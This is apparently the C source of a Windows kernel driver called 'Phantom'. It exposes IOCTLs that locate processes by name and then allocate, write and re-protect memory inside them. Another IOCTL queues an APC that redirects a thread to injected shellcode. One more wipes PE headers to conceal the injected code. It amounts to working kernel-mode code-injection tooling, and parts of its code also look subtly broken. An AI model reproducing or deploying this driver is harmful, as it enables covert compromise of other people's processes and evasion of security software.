#include "driver.h"
#include <stdio.h>

DRIVER_CONTEXT g_DriverContext = { 0 };

PEPROCESS PhantomReferenceProcessById(HANDLE ProcessId) {
    PEPROCESS Process = NULL;
    NTSTATUS Status = PsLookupProcessByProcessId(ProcessId, &Process);
    if (!NT_SUCCESS(Status)) {
        return NULL;
    }
    return Process;
}

NTSTATUS PhantomFindProcessByName(PCWSTR ProcessName, PULONG ProcessId) {
    NTSTATUS Status = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFORMATION ProcessInfo = NULL;
    ULONG ReturnLength = 0;
    ULONG ProcessNameLength = 0;

    if (ProcessName == NULL || ProcessId == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    ProcessNameLength = (ULONG)wcslen(ProcessName) * sizeof(WCHAR);

    Status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength);
    if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_TOO_SMALL) {
        return Status;
    }

    ProcessInfo = (PSYSTEM_PROCESS_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, ReturnLength, DRIVER_POOL_TAG);
    if (ProcessInfo == NULL) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    Status = ZwQuerySystemInformation(SystemProcessInformation, ProcessInfo, ReturnLength, &ReturnLength);
    if (!NT_SUCCESS(Status)) {
        ExFreePoolWithTag(ProcessInfo, DRIVER_POOL_TAG);
        return Status;
    }

    PSYSTEM_PROCESS_INFORMATION Current = ProcessInfo;
    while (Current->ImageName.Length > 0) {
        if (Current->ImageName.Length == ProcessNameLength &&
            RtlCompareMemory(Current->ImageName.Buffer, ProcessName, ProcessNameLength) == ProcessNameLength) {
            *ProcessId = (ULONG)Current->UniqueProcessId;
            ExFreePoolWithTag(ProcessInfo, DRIVER_POOL_TAG);
            return STATUS_SUCCESS;
        }

        if (Current->NextEntryOffset == 0) {
            break;
        }
        Current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)Current + Current->NextEntryOffset);
    }

    ExFreePoolWithTag(ProcessInfo, DRIVER_POOL_TAG);
    return STATUS_NOT_FOUND;
}

NTSTATUS PhantomAllocateMemory(ULONG ProcessId, SIZE_T Size, ULONG Protect, PVOID* BaseAddress) {
    PEPROCESS TargetProcess = NULL;
    KAPC_STATE ApcState = { 0 };
    NTSTATUS Status = STATUS_SUCCESS;
    PVOID Address = NULL;

    if (BaseAddress == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    TargetProcess = PhantomReferenceProcessById((HANDLE)ProcessId);
    if (TargetProcess == NULL) {
        return STATUS_INVALID_CID;
    }

    KeStackAttachProcess(TargetProcess, &ApcState);

    Status = ZwAllocateVirtualMemory(NtCurrentProcess(), &Address, 0, &Size, MEM_COMMIT | MEM_RESERVE, Protect);

    KeUnstackDetachProcess(&ApcState);
    ObDereferenceObject(TargetProcess);

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    *BaseAddress = Address;
    return STATUS_SUCCESS;
}

NTSTATUS PhantomWriteMemory(ULONG ProcessId, PVOID TargetAddress, PVOID Buffer, SIZE_T Size) {
    PEPROCESS TargetProcess = NULL;
    KAPC_STATE ApcState = { 0 };
    NTSTATUS Status = STATUS_SUCCESS;

    TargetProcess = PhantomReferenceProcessById((HANDLE)ProcessId);
    if (TargetProcess == NULL) {
        return STATUS_INVALID_CID;
    }

    KeStackAttachProcess(TargetProcess, &ApcState);

    __try {
        RtlCopyMemory(TargetAddress, Buffer, Size);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
    }

    KeUnstackDetachProcess(&ApcState);
    ObDereferenceObject(TargetProcess);

    return Status;
}

NTSTATUS PhantomQueueApc(ULONG ProcessId, ULONG ThreadId, PVOID ShellcodeAddress) {
    PEPROCESS TargetProcess = NULL;
    PETHREAD TargetThread = NULL;
    NTSTATUS Status = STATUS_SUCCESS;
    PKAPC Apc = NULL;

    TargetProcess = PhantomReferenceProcessById((HANDLE)ProcessId);
    if (TargetProcess == NULL) {
        return STATUS_INVALID_CID;
    }

    Status = PsLookupThreadByThreadId((HANDLE)ThreadId, &TargetThread);
    if (!NT_SUCCESS(Status)) {
        ObDereferenceObject(TargetProcess);
        return Status;
    }

    Apc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_POOL_TAG);
    if (Apc == NULL) {
        ObDereferenceObject(TargetThread);
        ObDereferenceObject(TargetProcess);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    KeInitializeApc(
        Apc,
        TargetThread,
        0,
        PhantomApcKernelRoutine,
        (PKRUNDOWN_ROUTINE)NULL,
        (PKNORMAL_ROUTINE)ShellcodeAddress,
        KernelMode,
        NULL
    );

    BOOLEAN Inserted = KeInsertQueueApc(Apc, NULL, NULL, 0);
    if (!Inserted) {
        ExFreePoolWithTag(Apc, DRIVER_POOL_TAG);
        Status = STATUS_UNSUCCESSFUL;
    }

    ObDereferenceObject(TargetThread);
    ObDereferenceObject(TargetProcess);

    return Status;
}

VOID PhantomApcKernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* Context, PBOOLEAN* Argument2) {
    UNREFERENCED_PARAMETER(Context);
    UNREFERENCED_PARAMETER(Argument2);

    PETHREAD Thread = Apc->Thread;
    PVOID ShellcodeAddress = Apc->NormalRoutine;

    PKTRAP_FRAME TrapFrame = NULL;
    if (KTHREAD_TRAP_FRAME_OFFSET) {
        TrapFrame = *(PKTRAP_FRAME*)((PUCHAR)Thread + KTHREAD_TRAP_FRAME_OFFSET);
    }

    if (TrapFrame != NULL) {
        TrapFrame->Rip = (ULONG64)ShellcodeAddress;
        *NormalRoutine = NULL;
    }

    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(Argument2);

    ExFreePoolWithTag(Apc, DRIVER_POOL_TAG);
}

NTSTATUS PhantomWipeHeader(ULONG ProcessId, PVOID BaseAddress, SIZE_T Size) {
    PEPROCESS TargetProcess = NULL;
    KAPC_STATE ApcState = { 0 };
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG i = 0;
    PUCHAR Buffer = NULL;

    TargetProcess = PhantomReferenceProcessById((HANDLE)ProcessId);
    if (TargetProcess == NULL) {
        return STATUS_INVALID_CID;
    }

    KeStackAttachProcess(TargetProcess, &ApcState);

    Buffer = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, Size, DRIVER_POOL_TAG);
    if (Buffer == NULL) {
        KeUnstackDetachProcess(&ApcState);
        ObDereferenceObject(TargetProcess);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    RtlZeroMemory(Buffer, Size);

    __try {
        RtlCopyMemory(BaseAddress, Buffer, min(Size, 0x1000));
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
    }

    ExFreePoolWithTag(Buffer, DRIVER_POOL_TAG);

    KeUnstackDetachProcess(&ApcState);
    ObDereferenceObject(TargetProcess);

    return Status;
}

NTSTATUS PhantomProtectMemory(ULONG ProcessId, PVOID Address, SIZE_T Size, ULONG NewProtect, PULONG OldProtect) {
    PEPROCESS TargetProcess = NULL;
    KAPC_STATE ApcState = { 0 };
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG Protect = 0;

    TargetProcess = PhantomReferenceProcessById((HANDLE)ProcessId);
    if (TargetProcess == NULL) {
        return STATUS_INVALID_CID;
    }

    KeStackAttachProcess(TargetProcess, &ApcState);

    Status = ZwProtectVirtualMemory(NtCurrentProcess(), &Address, &Size, NewProtect, &Protect);

    KeUnstackDetachProcess(&ApcState);
    ObDereferenceObject(TargetProcess);

    if (NT_SUCCESS(Status) && OldProtect != NULL) {
        *OldProtect = Protect;
    }

    return Status;
}

NTSTATUS PhantomGetProcessBase(ULONG ProcessId, PVOID* BaseAddress) {
    PEPROCESS TargetProcess = NULL;
    NTSTATUS Status = STATUS_SUCCESS;

    if (BaseAddress == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    TargetProcess = PhantomReferenceProcessById((HANDLE)ProcessId);
    if (TargetProcess == NULL) {
        return STATUS_INVALID_CID;
    }

    *BaseAddress = PsGetProcessSectionBaseAddress(TargetProcess);

    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}

NTSTATUS PhantomDispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG ControlCode = Stack->Parameters.DeviceIoControl.IoControlCode;
    PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG InputLength = Stack->Parameters.DeviceIoControl.InputBufferLength;
    ULONG OutputLength = Stack->Parameters.DeviceIoControl.OutputBufferLength;

    UNREFERENCED_PARAMETER(InputLength);
    UNREFERENCED_PARAMETER(OutputLength);

    switch (ControlCode) {
        case IOCTL_FIND_PROCESS: {
            PFIND_PROCESS_REQUEST Request = (PFIND_PROCESS_REQUEST)SystemBuffer;
            PFIND_PROCESS_RESPONSE Response = (PFIND_PROCESS_RESPONSE)SystemBuffer;
            Status = PhantomFindProcessByName(Request->ProcessName, &Response->ProcessId);
            Response->Status = Status;
            Irp->IoStatus.Information = sizeof(FIND_PROCESS_RESPONSE);
            break;
        }

        case IOCTL_ALLOCATE_MEMORY: {
            PALLOCATE_MEMORY_REQUEST Request = (PALLOCATE_MEMORY_REQUEST)SystemBuffer;
            PALLOCATE_MEMORY_RESPONSE Response = (PALLOCATE_MEMORY_RESPONSE)SystemBuffer;
            PVOID BaseAddress = NULL;
            Status = PhantomAllocateMemory(Request->ProcessId, Request->Size, Request->Protection, &BaseAddress);
            Response->BaseAddress = (ULONG_PTR)BaseAddress;
            Response->Status = Status;
            Irp->IoStatus.Information = sizeof(ALLOCATE_MEMORY_RESPONSE);
            break;
        }

        case IOCTL_WRITE_MEMORY: {
            PWRITE_MEMORY_REQUEST Request = (PWRITE_MEMORY_REQUEST)SystemBuffer;
            PWRITE_MEMORY_RESPONSE Response = (PWRITE_MEMORY_RESPONSE)SystemBuffer;
            Status = PhantomWriteMemory(Request->ProcessId, Request->TargetAddress, Request->Data, Request->Size);
            Response->Status = Status;
            Irp->IoStatus.Information = sizeof(WRITE_MEMORY_RESPONSE);
            break;
        }

        case IOCTL_QUEUE_APC: {
            PQUEUE_APC_REQUEST Request = (PQUEUE_APC_REQUEST)SystemBuffer;
            PQUEUE_APC_RESPONSE Response = (PQUEUE_APC_RESPONSE)SystemBuffer;
            Status = PhantomQueueApc(Request->ProcessId, Request->ThreadId, (PVOID)Request->ApcRoutine);
            Response->Status = Status;
            Irp->IoStatus.Information = sizeof(QUEUE_APC_RESPONSE);
            break;
        }

        case IOCTL_WIPE_HEADER: {
            PWIPE_HEADER_REQUEST Request = (PWIPE_HEADER_REQUEST)SystemBuffer;
            PWIPE_HEADER_RESPONSE Response = (PWIPE_HEADER_RESPONSE)SystemBuffer;
            Status = PhantomWipeHeader(Request->ProcessId, (PVOID)Request->BaseAddress, Request->Size);
            Response->Status = Status;
            Irp->IoStatus.Information = sizeof(WIPE_HEADER_RESPONSE);
            break;
        }

        case IOCTL_PROTECT_MEMORY: {
            PPROTECT_MEMORY_REQUEST Request = (PPROTECT_MEMORY_REQUEST)SystemBuffer;
            PPROTECT_MEMORY_RESPONSE Response = (PPROTECT_MEMORY_RESPONSE)SystemBuffer;
            Status = PhantomProtectMemory(Request->ProcessId, Request->Address, Request->Size, Request->NewProtection, &Request->OldProtection);
            Response->Status = Status;
            Irp->IoStatus.Information = sizeof(PROTECT_MEMORY_RESPONSE);
            break;
        }

        case IOCTL_GET_PROCESS_BASE: {
            PGET_PROCESS_BASE_REQUEST Request = (PGET_PROCESS_BASE_REQUEST)SystemBuffer;
            PGET_PROCESS_BASE_RESPONSE Response = (PGET_PROCESS_BASE_RESPONSE)SystemBuffer;
            Status = PhantomGetProcessBase(Request->ProcessId, &Response->BaseAddress);
            Response->Status = Status;
            Irp->IoStatus.Information = sizeof(GET_PROCESS_BASE_RESPONSE);
            break;
        }

        default: {
            Status = STATUS_INVALID_DEVICE_REQUEST;
            Irp->IoStatus.Information = 0;
            break;
        }
    }

    Irp->IoStatus.Status = Status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return Status;
}

VOID PhantomUnloadDriver(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING SymLinkName = RTL_CONSTANT_STRING(PHANTOM_SYMLINK_NAME);

    if (g_DriverContext.DeviceCreated) {
        IoDeleteDevice(g_DriverContext.DeviceObject);
        g_DriverContext.DeviceCreated = FALSE;
    }

    IoDeleteSymbolicLink(&SymLinkName);

    DbgPrint("[Phantom] Driver unloaded successfully\n");
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS Status = STATUS_SUCCESS;
    UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(PHANTOM_DEVICE_NAME);
    UNICODE_STRING SymLinkName = RTL_CONSTANT_STRING(PHANTOM_SYMLINK_NAME);

    RtlZeroMemory(&g_DriverContext, sizeof(DRIVER_CONTEXT));

    Status = IoCreateDevice(
        DriverObject,
        0,
        &DeviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &g_DriverContext.DeviceObject
    );

    if (!NT_SUCCESS(Status)) {
        DbgPrint("[Phantom] Failed to create device: 0x%X\n", Status);
        return Status;
    }

    g_DriverContext.DeviceCreated = TRUE;

    Status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);
    if (!NT_SUCCESS(Status)) {
        DbgPrint("[Phantom] Failed to create symbolic link: 0x%X\n", Status);
        IoDeleteDevice(g_DriverContext.DeviceObject);
        g_DriverContext.DeviceCreated = FALSE;
        return Status;
    }

    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = PhantomDispatchIoctl;
    DriverObject->DriverUnload = PhantomUnloadDriver;

    g_DriverContext.DeviceObject->Flags |= DO_DIRECT_IO;
    g_DriverContext.DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[Phantom] Driver loaded successfully\n");
    return STATUS_SUCCESS;
}
